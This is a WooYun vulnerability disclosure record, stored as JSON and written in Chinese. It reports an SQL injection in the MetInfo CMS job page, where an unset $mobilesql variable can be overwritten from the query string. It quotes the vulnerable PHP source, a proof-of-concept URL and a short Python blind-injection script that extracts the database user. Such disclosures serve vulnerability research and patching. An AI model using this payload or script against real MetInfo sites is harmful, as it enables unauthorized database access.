{"id": 49188, "wybug_id": "wooyun-2014-074909", "wybug_title": "Metinfo SQL注入漏洞", "wybug_corp": "MetInfo", "wybug_author": "magerx", "wybug_date": "2014-09-03 17:31", "wybug_open_date": "2014-12-02 17:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "安全意识不足", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-02：\t细节向公众公开  简要描述： sql injection :: wooyun通用型又更坚挺了 继续支持下 详细说明：  job/job.php\n<?php# MetInfo Enterprise Content Management System # Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. require_once '../include/common.inc.php';$classaccess= $db->get_one(\"SELECT * FROM $met_column WHERE module='6' and lang='$lang'\");$metaccess=$classaccess[access];$class1=$classaccess[id];require_once '../include/head.php';\t$guanlian=$class_list[$class1][releclass];\t$class1_info=$class_list[$class1][releclass]?$class_list[$class_list[$class1][releclass]]:$class_list[$class1];\t$class2_info=$class_list[$class1][releclass]?$class_list[$class1]:$class_list[$class2];\tif(!class1_info){\tokinfo('../',$lang_error);\t}    $serch_sql=\" where lang='$lang' {$mobilesql} and displaytype='1' and ((TO_DAYS(NOW())-TO_DAYS(`addtime`)< useful_life) OR useful_life=0) \";\tif($met_member_use==2)$serch_sql .= \" and access<=$metinfo_member_type\";\t$order_sql=\"order by no_order desc,addtime desc\";    $total_count = $db->counter($met_job, \"$serch_sql\", \"*\");\t$totaltop_count = $db->counter($met_job, \"$serch_sql and top_ok='1'\", \"*\");\n重点看下这一句：\n$serch_sql=\" where lang='$lang' {$mobilesql} and displaytype='1' and ((TO_DAYS(NOW())-TO_DAYS(`addtime`)< useful_life) OR useful_life=0) \";\n找了半天没有看到$mobilesql的声明，根本没有初始值，后来发现原来metinfo会有类似全局变量注册的机制，导致这里可以通过get/post等覆盖$mobilesql由于这里是直接拼接起来的所以可以不用考虑gpc开关，直接是一个逻辑盲注，当然要考虑很多关键字过滤。   漏洞证明：  poc:\nhttp://localhost/metinfo/job/job.php?mobilesql=and%20ord(mid(user(),1,1))=114\n这样会返回正确页面刚好有时间就随手写了个利用,偷懒就写得比较简单exp:\nimport urllib2import redef inject(payload):    url = 'http://localhost/metinfo/job/job.php?mobilesql='    print url+payload    req = urllib2.Request(url+payload)    response = urllib2.urlopen(req)    content = response.read()    return contentwordlist = '@abcdefghijklmnopqrst'def user():    result = \"\"    for i in range(1,15):        for num in range(len(wordlist)):            keyword = ord(wordlist[num])            content = inject(\"and%20ord(mid(user(),{0},1))={1}\".format(i,keyword))            match = re.search('list top',content)            if match:                print str(i)+'===========>'+chr(keyword)                result = result+chr(keyword)                break    print 'current_user:===========>'+resultuser()\n结果如图：\n\n   修复方案：  0.0   版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-09-08 09:35 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-21 10:50 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  话说漏洞是在后台还是前台? o.o    \n     2014-10-15 15:26 |    \t\tToySweet \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:8        | 做有道德的安全研究员。)\t\t \n  又更坚挺了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}